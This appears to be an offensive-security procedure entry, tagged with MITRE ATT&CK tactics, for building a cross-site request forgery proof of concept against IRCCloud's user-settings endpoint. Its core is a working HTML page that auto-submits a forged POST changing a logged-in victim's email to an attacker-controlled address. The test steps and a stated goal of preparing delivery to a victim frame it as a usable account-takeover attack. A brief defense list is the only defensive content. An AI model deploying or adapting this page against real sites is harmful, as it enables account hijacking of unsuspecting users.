---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - csrf
  - poc-creation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:22.812Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-CSRF-POC-for-Email-Change

## Summary

This procedure involves crafting a proof-of-concept HTML page that exploits a CSRF vulnerability in IRCCloud's user settings endpoint to forge a request changing the victim's email address without proper token validation.

## Description

In the IRCCloud application, the user-settings endpoint at https://www.irccloud.com/chat/user-settings lacks CSRF protection, allowing external sites to submit POST requests that modify sensitive settings like email. This procedure creates a simple HTML file with a form that auto-submits or prompts user interaction to send the forged request. Prerequisites include basic HTML/JavaScript knowledge and access to test the endpoint. Expected outcome is a successful email change confirmation via JSON response.

## Requirements

1. Text editor to create HTML file
2. Victim must be logged into IRCCloud in their browser
3. Attacker email address for the change

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens on all state-changing endpoints
- Use SameSite cookies and monitor for anomalous requests from external referrers
- Rate-limit password reset requests

## Objectives

1. Forge a request to update user email
2. Confirm vulnerability without direct access
3. Prepare for delivery to victim

## Instructions

### Step 1: Craft the HTML PoC

**Context**: Write an HTML file that includes a form targeting the vulnerable endpoint with the new email parameter.

No specific command; use a text editor to create 'a.html':

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrfForm" action="https://www.irccloud.com/chat/user-settings" method="POST">
    <input type="hidden" name="email" value="attacker@example.com">
    <input type="submit" value="Update Settings">
</form>
<script>
    document.getElementById('csrfForm').submit();
</script>
</body>
</html>
```

> This creates a form that submits the email change. The script auto-submits on load, or the button can be clicked for interaction. Expected output: Browser sends POST request.

### Step 2: Test the PoC Locally

**Context**: Load the HTML in a browser while authenticated to IRCCloud to verify the request.

Open 'a.html' in a browser tab where IRCCloud is logged in.

> Expected output: Network tab shows POST to user-settings with success JSON {"_reqid":0,"success":true}.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[web-exploitation]]
